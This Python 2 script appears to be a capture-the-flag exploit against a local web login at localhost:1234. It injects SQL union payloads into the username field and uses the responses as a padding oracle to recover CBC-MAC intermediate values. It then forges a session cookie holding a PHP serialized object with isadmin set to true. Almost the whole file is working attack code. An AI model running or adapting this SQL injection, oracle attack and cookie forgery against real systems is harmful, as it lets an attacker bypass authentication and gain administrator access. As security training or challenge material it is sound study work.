#!/usr/bin/env python

import requests
import re
from base64 import b64decode as decode
from base64 import b64encode as encode
import urllib
from termcolor import colored, cprint
import sys

print_green = lambda x: cprint(x,"green")
URL = "http://localhost:1234/"

def str_to_hex(str):
    return ''.join("|{:02x}".format(ord(c)) for c in str)

# XOR 2 string
def xor(a, b):
    res = ""
    for i in range(16):
        res += chr(ord(a[i]) ^ ord(b[i]))

    return res

# padding oracle

def oracle(payload):
    data = {"username": "admin' and 1=2 union select 'admin', '" + encode(payload) + "' -- asd", "password": ""}
    r = requests.post(URL, data=data)
    m = re.search(r"Hello", r.content)
    return not m

def decrypt(enc):
    imd=""
    for i in range(len(imd),16):
        iv=""
        for im in imd:
            iv+=chr((i+1)^ord(im))
            #sys.stdout.write("\r\033\[31m%s\033[0m" % iv)
            #print iv
        iv=iv[::-1]
        for j in range(256):
            ivt=chr(j)+iv
            sys.stdout.write("IVT: \033[31m%s\033[0m\r" % str_to_hex(ivt))
            ivt = "\00"*16 + "\00"*(16-len(ivt)) + ivt
            #sys.stdout.write("\rIVT: \033[31m%s\033[0m" % str_to_hex(ivt))
            if oracle(ivt + enc):
                imd += chr(j^(i+1))
                res = "\x00"*(16 - len(imd)) + imd[::-1]
                break

    return imd[::-1]

payloads = ['aaaaaaaaaadddddddddddddddd";s:7:"isadmin";b:1;}', 'aaaaaaaaaadddddddddddddddd']
print len(payloads[0])
print len(payloads[1])
dummy = "dddddddddddddddd"

imds = []
macs = []

for payload in payloads:
    print_green("\nGet session with username " + repr(payload))
    data = {"username": "admin' and 1=2 union select '" + payload + "', 'Z2dleg==' -- asd", "password": ""}
    r = requests.post(URL, data=data)
    sess = decode(urllib.unquote(r.cookies["JSESSION"]))

    mac = sess[-16:]
    print "MAC: " + str_to_hex(mac)
    macs.append(mac)
    plain = sess[:-16]
    print "Plain: " + plain
    pad = 16 - (len(plain)%16)

    plain = plain + (chr(pad) * pad)
    for i in range(len(plain), 0, -16):
        p = plain[i-16:i]
        print "\nDecrypt block [ " + mac.encode("hex") + " ] from plain " + repr(p)
        imd = decrypt(mac)
        mac = xor(imd, p)

        if p == dummy:
            print "\n[+] got imd of dummy block [ " + imd.encode("hex") + " ]"
            imds.append(imd)
            break

print "Concat block with patch the dummy block (len(imds): %d, len(dummy): %d) " % (len(imds),len(dummy))
before = xor(imds[1], dummy)
shouldbe = imds[0]
patch = xor(before, shouldbe)
sess = encode('a:2:{s:4:"name";s:26:"aaaaaaaaaa' + patch + '";s:7:"isadmin";b:1;}";s:7:"isadmin";N;}' + macs[0])
print sess
r = requests.get(URL, cookies={'JSESSION': sess})
print r.content
